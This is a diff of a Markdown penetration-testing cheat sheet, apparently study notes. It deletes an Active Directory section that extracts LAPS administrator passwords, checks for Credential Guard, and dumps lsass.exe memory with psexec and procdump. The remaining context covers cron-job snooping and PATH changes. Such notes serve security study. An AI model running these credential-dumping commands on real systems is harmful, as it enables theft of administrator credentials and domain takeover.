@@ -180,35 +180,6 @@ Finally, we can modify our path with ```export PATH=YOUR_PATH_HERE:$PATH```, whi
 ### Cron Jobs and Process
 Sometimes, root may run certain cron jobs or processes periodically. You can check running cron jobs with ```cat /etc/crontab``` or you can simply use ```pspy``` to spy on currently running cron jobs and processes, including the commands used to invoke them initially.
 
-## Active Directory
-Main goal is to gain access to the Local Administrator account on the Domain Controller.
-
-```whoami /priv``` can be used to check user privileges.
-
-```net user``` can be used to check group memberships.
-
-### LAPS
-If the current user is part of the ```LAPS_Readers``` group we can use it to read and extract the Local Administrator password with
-```powershell
-Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
-```
-
-### LSAS.exe (Local Security Authority Subsystem Service)
-**Note:** You must have enough permissions (system rights) to dump LSAS.exe and Credential Guard **cannot** be configured and running.
-
-Check if Credential Guard is configured and running
-```powershell
-$DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
-if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
-if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
-```
-
-Create command prompt with system rights (Windows Defender will prevent process dump if you do not have system rights) and dump.
-```powershell
-psexec -i -s cmd
-procdump -ma lsass.exe lsass.dmp
-```
-
 ## Useful URLS
 - https://github.com/swisskyrepo/PayloadsAllTheThings
 - https://github.com/undergroundwires/CEH-in-bullet-points
